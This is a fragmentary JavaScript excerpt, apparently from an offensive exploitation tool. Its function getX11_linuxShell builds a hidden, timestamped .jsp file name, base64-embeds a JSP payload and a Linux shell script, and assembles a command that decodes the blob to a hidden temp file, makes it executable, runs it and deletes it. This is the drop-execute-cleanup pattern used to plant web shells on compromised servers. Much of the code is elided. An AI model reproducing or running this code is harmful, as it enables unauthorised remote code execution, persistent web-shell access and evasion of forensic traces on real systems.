...
function fnCheckUrl(url,oArgs)
{
	...
	_t.getX11_linuxShell = function(s1_)
	{
		 var szJspName = ".O0"+ new Date().getTime() + ".jsp",
			...
			"B64Jsp=\""+ fs.readFileSync("payload/x.jsp").toString("base64") + "\"\n" +
			fs.readFileSync("payload/linuxShellX11.sh").toString("utf-8") +
			...
			var szTmpFN = "./._t_",s1_1 = formatPayload(s1_, "echo " + sTmp1 + "|base64 -d>" + szTmpFN + ";chmod +x " + szTmpFN + ";" + szTmpFN + ";rm " + szTmpFN);
